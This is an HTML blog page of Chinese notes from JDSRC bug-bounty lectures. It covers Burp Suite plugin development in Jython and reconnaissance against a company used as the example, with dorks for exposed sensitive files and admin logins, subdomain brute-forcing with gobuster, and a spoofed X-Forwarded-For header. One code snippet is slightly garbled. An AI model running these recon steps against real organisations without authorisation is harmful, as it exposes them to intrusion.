@@ -1,0 +1,1311 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="JDSRC安全课笔记, 像清水一般清澈透明">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>JDSRC安全课笔记 | 像清水一般清澈透明</title>
+    <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/css/my.css">
+
+    <script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 4.1.1">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="像清水一般清澈透明" type="application/atom+xml">
+
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">像清水一般清澈透明</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">像清水一般清澈透明</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+<script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/medias/featureimages/1.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">JDSRC安全课笔记</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E7%AC%94%E8%AE%B0/" class="post-category">
+                                笔记
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-07-20
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    4.4k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    17 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>﻿# 第一期</p>
+<h2 id="逻辑漏洞挖掘"><a href="#逻辑漏洞挖掘" class="headerlink" title="逻辑漏洞挖掘"></a>逻辑漏洞挖掘</h2><p>   逻辑漏洞中的认证缺失和认证缺陷漏洞，主要指功能级访问控制缺失，出现任意增删改查用户信息的情况。实际业务场景中，这类漏洞大概两个成因，上线前没有做好认证处理，或权限环节控制不到位。基于工具开发，我们可以通过域名信息收集、站点信息爬取、规则的分析与提取，以及批量处理结果分析与展示四个环节快速发现认证缺失漏洞和认证缺陷漏洞。</p>
+<h1 id="第二期"><a href="#第二期" class="headerlink" title="第二期"></a>第二期</h1><h2 id="基于-burpsuite的web逻辑漏洞插件开发"><a href="#基于-burpsuite的web逻辑漏洞插件开发" class="headerlink" title="基于 burpsuite的web逻辑漏洞插件开发"></a>基于 burpsuite的web逻辑漏洞插件开发</h2><p>Burp Suite作为web应用程序渗透测试集成平台,常被用来进行网站渗透测试。BurpSuite 提供了插件开发接口，支持Java、Python、Ruby语言的扩展。虽然 BApp Store 上面已经提供了很多插件，其中也不乏优秀好用的插件，（推荐几个个人感觉好的插件）CO2,Logger++,Autorize,XSS Validator。但是通用化的工具无法完全符合web安全测试人员的特定需求。</p>
+<p>1、为什么要独立开发插件<br>2、开发环境配置说明；<br>3、插件开发关键接口的使用实例；<br>4、逻辑漏洞检测插件开发探讨；</p>
+<p>1.为什么要独立开发插件<br>随着厂商安全意识增强，传输过程中，大多数线上业务通过https传输，传输流量加密。无法做中间人攻击了就，服务端，数据库中的敏感数据加密存储，访问控制受限，即使拿到数据库也无法拿到明文数据。但是数据在客户端最终要展示给用户，必然明文展现。传统的安全防御设备和措施对逻辑漏洞收效甚微，现在攻击者更倾向于在客户端利用此类漏洞。而逻辑漏洞种类很多，通用化的工具无法完全符合web安全测试人员的特定需求。一个业务的逻辑漏洞抽象出来的模型，难以在其他业务层进行批量处理，通用的解决方案往往效果不佳。但是一个业务层抽象出来的模型，在其自身站点往往具有通用性。例如，某URL存在越权，可能该站点其他URL也可能存在类似的问题。我们基于该URL特征，开发burpsuite插件，批量扫描该站点，就能更全面的发现同类问题。因此，我们有必要根据自己的业务需求，自己能够独立开发插件。</p>
+<p>2.开发环境配置<br>Burp支持Java、Python、Ruby语言的扩展，本次讲座以python环境为 例进行说明。Burpsuite 是运行在java环境，所有的库是java所写。Python作为开发语言，调用Java库就要用到Jython。</p>
+<p>以MacOS为 例子进行说明：<br>brew install jython，就可以了，Burpsuite Jython环境的配置：Extender -&gt; options -&gt; python Environment -&gt; select file,导入下载好的jython jar包。<img src="https://img-blog.csdnimg.cn/20200207154012356.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>3.：插件开发关键接口的使用实例，重点讲几个接口</p>
+<p>API接口查阅可以从以下拿到：<br>API接口文档可以在burpsuite 的Extender -&gt; APIs<br>也可以通过<a href="https://portswigger.net/burp/extender/api/index.html进行查阅。" target="_blank" rel="noopener">https://portswigger.net/burp/extender/api/index.html进行查阅。</a><br>IBurpExtender<br>IBurpExtender是Burpsuite插件的入口，所有插件的开发都必须要实现。<br>当插件被建立以后，registerExtenderCallbacks也需要实现。<br>代码如下：class BurpExtender(IBurpExtender):<br>def registerExtenderCallbacks(self, callbacks):<br>参数callbacks可获取核心基础库,例如日志，请求，返回值修改等。<br>IExtensionHelpers:<br>提供了编写扩展中常用的一些通用函数，比如编解码、构造请求、获取请求参数，获取请求头等。如：IRequestInfo analyzeRequest(byte[] request)<br>通过analyzeRequest函数，可以拿到请求的细节。<br>通过如下几个接口方法可以拿到。<br><img src="https://img-blog.csdnimg.cn/20200207154237626.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>IHttpRequestResponse: 这个接口包含了每个请求和响应的细节。在Brupsuite中的每个请求或者响应都是IHttpRequestResponse实例。通过getRequest()， getResponse()方法可以获取请求和响应的细节信息。</p>
+<p>以registerHttpListener为例进行代码说明：</p>
+<p><img src="https://img-blog.csdnimg.cn/2020020715432066.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>如图所示，在user 和 webserver之间建立监听，调用HttpListener接口。获取请求，响应的日志。<br>实现这个功能，最重要的是这个方法：    </p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">register ourselves as an HTTP listener callbacks.registerHttpListener(self)</span><br><span class="line">    def registerExtenderCallbacks(self, callbacks):</span><br><span class="line">        self._callbacks = callbacks</span><br><span class="line">        self._helpers = callbacks.getHelpers()</span><br><span class="line">        ## 设置插件名</span><br><span class="line">        self._callbacks.setExtensionName("getTheRequest")</span><br></pre></td></tr></tbody></table></figure>
+<pre><code> # //如果没有注册，下面的processHttpMessage方法是不会生效的。处理请求和响应包的插件，这个应该是必要的
+
+   callbacks.registerHttpListener(self)
+### processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo)，
+### 在messageInfo这个参数中，我们可以获取到request和response日志。</code></pre><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">processHttpMessage</span><span class="params">(self, toolFlag, messageIsRequest, messageInfo)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> toolFlag == <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> messageIsRequest:</span><br><span class="line">                request = messageInfo.getRequest()</span><br><span class="line">                analyzedRequest = self._helpers.analyzeResponse(request)</span><br><span class="line">                request_header = analyzedRequest.getHeaders()</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    method, path = res_path.findall(request_header[<span class="number">0</span>])[<span class="number">0</span>]</span><br><span class="line">                    host = res_host.findall(request_header[<span class="number">1</span>])[<span class="number">0</span>]</span><br><span class="line">                    url = method + <span class="string">" "</span> + host + path</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    url = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> method == <span class="string">"GET"</span>:</span><br><span class="line">                    <span class="keyword">print</span> “[+++++]The URL <span class="keyword">is</span> <span class="string">", url</span></span><br><span class="line"><span class="string">                    print "</span>[+++++]The host <span class="keyword">is</span> <span class="string">",host</span></span><br><span class="line"><span class="string">                    print "</span>[++++] The URI <span class="keyword">is</span> following<span class="string">"</span></span><br><span class="line"><span class="string">                    print path</span></span><br><span class="line"><span class="string">                    for iterm in path.split("</span>/<span class="string">"):</span></span><br><span class="line"><span class="string">                        print iterm</span></span><br><span class="line"><span class="string">                    print "</span>======================================================================================<span class="string">"</span></span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></tbody></table></figure>
+<p><code>代码如上所示，就可以打印出URL，HOST，URI日志信息</code><br><img src="https://img-blog.csdnimg.cn/20200207154729683.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这是一个demo。延伸一下，我们在做渗透测试的过程中，往往苦于目录字典不全，我们将这个URI生成目录字典，为目录爆破做准备。</p>
+<hr>
+<p>如果做扫描类插件：<br>class BurpExtender(IBurpExtender,IScannerCheck)<br>callbacks.registerScannerCheck(this);<br>实现IScannerCheck后需要重写被动扫描的函数。<br>doPassiveScan(IHttpRequestResponse baseRequestResponse) {}<br>doPassiveScan这个接口，在baseRequestResponse获取请求和响应数据，并利用这些数据进行基于扫描规则进行扫描。</p>
+<h1 id="第四期-SRC挖掘"><a href="#第四期-SRC挖掘" class="headerlink" title="第四期 SRC挖掘"></a>第四期 SRC挖掘</h1><p>首先将公司架构吧，我们就以京东为例吧</p>
+<p>企业的组织架构信息可通过开源信息获取。<br>常用的方法，通过维基百科，百度百科等确定企业的大体组织架构；<br>zh.wikipedia.org<br>baike.baidu.com</p>
+<p><img src="https://img-blog.csdnimg.cn/20200306154856499.jpg" alt="在这里插入图片描述">结合以下站点信息，进一步确定企业组织架构：<br>国家企业信用公示系统：<a href="http://www.gsxt.gov.cn/index.html" target="_blank" rel="noopener">http://www.gsxt.gov.cn/index.html</a><br>天眼查：<a href="https://www.tianyancha.com/" target="_blank" rel="noopener">https://www.tianyancha.com/</a></p>
+<p>公司架构确定完成后，我们开始被动信息的收集</p>
+<p>被动信息收集是指不与目标直接交互，通过公开的渠道获取获取目标信息。<br>可从以下几点展开，DNS信息收集，https证书信息，搜索引擎，网络空间安全搜索引擎，基于备案资料信息收集。</p>
+<p>DNS信息收集<br>通过目标站点的域名注册信息，如whois日志进行信息关联。</p>
+<p>国外常用的whois查询站点：<br><a href="https://who.is/" target="_blank" rel="noopener">https://who.is/</a><br><a href="https://whois.cymru.com/cgi-bin/whois.cgi" target="_blank" rel="noopener">https://whois.cymru.com/cgi-bin/whois.cgi</a><br><a href="https://whois.arin.net/ui/query.do" target="_blank" rel="noopener">https://whois.arin.net/ui/query.do</a></p>
+<p>国内常用的whois查询站点：<br>[图片]<a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a><br><a href="https://whois.aizhan.com/" target="_blank" rel="noopener">https://whois.aizhan.com/</a></p>
+<p>通过whois查询确定注册者，然后关联同一注册者的其他站点信息。</p>
+<p><a href="https://viewdns.info/reversewhois/?q=email@111.com" target="_blank" rel="noopener">https://viewdns.info/reversewhois/?q=email@111.com</a><br><a href="https://whois.chinaz.com/reverse?ddlSearchMode=2" target="_blank" rel="noopener">https://whois.chinaz.com/reverse?ddlSearchMode=2</a></p>
+<p>https证书信息，即通过https证书进行信息收集，可通过采用以下几种方式</p>
+<p>基于证书透明度两个站点：<br><a href="https://certspotter.com/api/v0/certs" target="_blank" rel="noopener">https://certspotter.com/api/v0/certs</a><br><a href="https://crt.sh" target="_blank" rel="noopener">https://crt.sh</a></p>
+<p>为方便信息处理，可编写脚本处理：<br>crtFetch -d example.com</p>
+<p><img src="https://img-blog.csdnimg.cn/2020030615473366.jpg" alt="在这里插入图片描述"><br>我们看到就可以梳理出一部分子域名信息了<br>脚本位置：<a href="https://github.com/3stoneBrother/personalTools/blob/master/scripts/crtFetch.py" target="_blank" rel="noopener">https://github.com/3stoneBrother/personalTools/blob/master/scripts/crtFetch.py</a></p>
+<p>该脚本对在线站点获取的域名进行清洗，可获取到单域名SSL证书和通配符SSL证书两类。</p>
+<p>有时候我们可能忽略的地方，有些企业的https证书中的相关域名可在浏览器证书中点击查看；</p>
+<p><img src="https://img-blog.csdnimg.cn/20200306154605875.jpg" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200306154625356.jpg" alt="在这里插入图片描述"></p>
+<p>基于goolge hack技术可以查询到很多敏感信息。<br>更详细的用法可在这里查询：<br><a href="https://www.exploit-db.com/google-hacking-database" target="_blank" rel="noopener">https://www.exploit-db.com/google-hacking-database</a></p>
+<p>我们常用关键字查询：<br>site：搜索域名的范围<br>inurl：URL格式<br>intitle：搜索的网页标题<br>intext：搜索包含其中文字的网页<br>filetype：搜索文件的后缀或者扩展名<br>cache：搜索搜索引擎里关于某些内容的缓存，可能会在过期内容中发现有价值的信息<br>link：搜索某个网站的链接<br>info：查找指定站点的一些基本信息</p>
+<h2 id="【查找敏感文件】"><a href="#【查找敏感文件】" class="headerlink" title="【查找敏感文件】"></a>【查找敏感文件】</h2><p>site:xxx.com (filetype:doc OR filetype:ppt OR filetype:pps OR filetype:xls OR filetype:docx OR filetype:pptx OR filetype:ppsx OR filetype:xlsx OR filetype:odt OR filetype:ods OR filetype:odg OR filetype:odp OR filetype:pdf OR filetype:wpd OR filetype:svg OR filetype:svgz OR filetype:indd OR filetype:rdp OR filetype:sql OR filetype:xml OR filetype:db OR filetype:mdb OR filetype:sqlite)</p>
+<h2 id="【查找敏感目录地址】"><a href="#【查找敏感目录地址】" class="headerlink" title="【查找敏感目录地址】"></a>【查找敏感目录地址】</h2><p>site:xxx.com inurl:login|admin|manage|admin_login|system|user|auth|dev|test<br>site:xxx.com intitle:后台|管理|内部|登录|系统</p>
+<p>以下可能是我们会忽略的几个关键字查询语句：</p>
+<h3 id="基于备案号，copyright信息查询"><a href="#基于备案号，copyright信息查询" class="headerlink" title="基于备案号，copyright信息查询"></a>基于备案号，copyright信息查询</h3><p>intext:”Tesla © 2020”<br>intext:”京ICP备11041704号-15”</p>
+<h2 id="可以正则的形式"><a href="#可以正则的形式" class="headerlink" title="可以正则的形式"></a>可以正则的形式</h2><p>site:dev.<em>.</em>/signin<br>site:<em>/recover-pass<br>site:smtp.</em>.<em>/login<br>site:/com:</em><br>site:/216.75.<em>.</em></p>
+<p>##基于端口或者端口范围查询<br>site:/com:8443/<br>site:/com:* 8000…9000</p>
+<p>查询到的关键词，利用备案信息可以大致确定各个站点的域名信息。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200306155039691.jpg" alt="在这里插入图片描述"><br>curl <a href="http://www.beianbeian.com/search-1/example.html" target="_blank" rel="noopener">http://www.beianbeian.com/search-1/example.html</a> | grep “<br>“ |  grep -o “www.\w<em>.\w</em>“ | sort | uniq |sed “s/www.//g”</p>
+<p><img src="https://img-blog.csdnimg.cn/20200306155121441.png" alt="在这里插入图片描述"></p>
+<p>不断的根据网络备案/许可证号进行反查，即可梳理更多的资产信息。<br>确定企业的IP段，可基于<a href="https://bgp.he.net/站点进行收集。" target="_blank" rel="noopener">https://bgp.he.net/站点进行收集。</a><br>输入公司名称可查询该公司的IP资产信息，然后正则匹配IP段：<br>cat aa.txt| grep -Eo “&lt;td&gt;.<em>?td&gt;“| grep “href”| grep -Eo “([0-9]{1,3}[.]){3}[0-9]{1,3}/</em>[0-9]{0,2}”</p>
+<h2 id="微信公共号"><a href="#微信公共号" class="headerlink" title="微信公共号"></a>微信公共号</h2><p>基于公众号信息，我们可以挖掘到很多的厂商业务信息。公司的公众号信息可在sogou搜索引擎可以进行查询。<br><a href="https://weixin.sogou.com/weixin?type=1&amp;ie=utf8&amp;query=%E4%BA%AC%E4%B8%9C" target="_blank" rel="noopener">https://weixin.sogou.com/weixin?type=1&amp;ie=utf8&amp;query=%E4%BA%AC%E4%B8%9C</a><br>为便于快速梳理，可用脚本处理。<br>python gongzhonghao.py -d “目标公司”<br><a href="https://github.com/3stoneBrother/personalTools/blob/master/scripts/gongzhonghao.py" target="_blank" rel="noopener">https://github.com/3stoneBrother/personalTools/blob/master/scripts/gongzhonghao.py</a></p>
+<p><img src="https://img-blog.csdnimg.cn/20200306155403699.jpg" alt="在这里插入图片描述"><br>这就得到某公司的所有公众号信息</p>
+<h2 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h2><p>通过被动信息收集到一批域名，IP信息。以主动信息比较容易忽略的三级域名，甚至四级域名为例进行说明。通配符SSL证书往往是三级、四级域名高效爆破的目标，为批量处理，在crtFetch脚本中提取了需要进一步爆破的三级、四级域名。</p>
+<p>然后进行域名爆破，爆破工具有很多，以gobuster为例进行演示：<br>gobuster dns -t 30 -w  sub_name.txt -i  -q –wildcard -d api.example.com| tee  domains-active.txt</p>
+<p><img src="https://img-blog.csdnimg.cn/20200306155621157.png" alt="在这里插入图片描述"><br>这些三级四级域名，防护往往会薄弱一些</p>
+<p>域名是否存活可利用httprobe工具确定。<br>cat domain.txt | httprobe &gt; domain-alive.txt </p>
+<p><img src="https://img-blog.csdnimg.cn/20200306155753708.png" alt="在这里插入图片描述"><br>也可通过whatweb查看链接的服务器版本，标题等信息，处理结果如下图所示<br><img src="https://img-blog.csdnimg.cn/20200306155835844.png" alt="在这里插入图片描述"><br>为便于批量查看URL内容，我们可通过屏幕截图工具webscreenshot进行处理。<br>具体方法如下：首先将存活的站点截图到screenshots文件夹下面：<br>webscreenshot -i alive.txt -o screenshots -w 20 -m -a “X-FORWARDED-FOR:127.0.0.1”<br>为便于浏览，我们将截图生成一个html文件便于在浏览器查看：<br>for I in $(ls -S); do echo “$I” &gt;&gt; index.html；echo “&lt;\ img src=$I&gt;&lt;br&gt;” &gt;&gt; index.html； done<br>在浏览器中打开 index.html文件，就可看到所有的网页截图了。效果如下图，所有存活站点都在一个页面展现出来。可根据站点内容做进一步的渗透测试。</p>
+<hr>
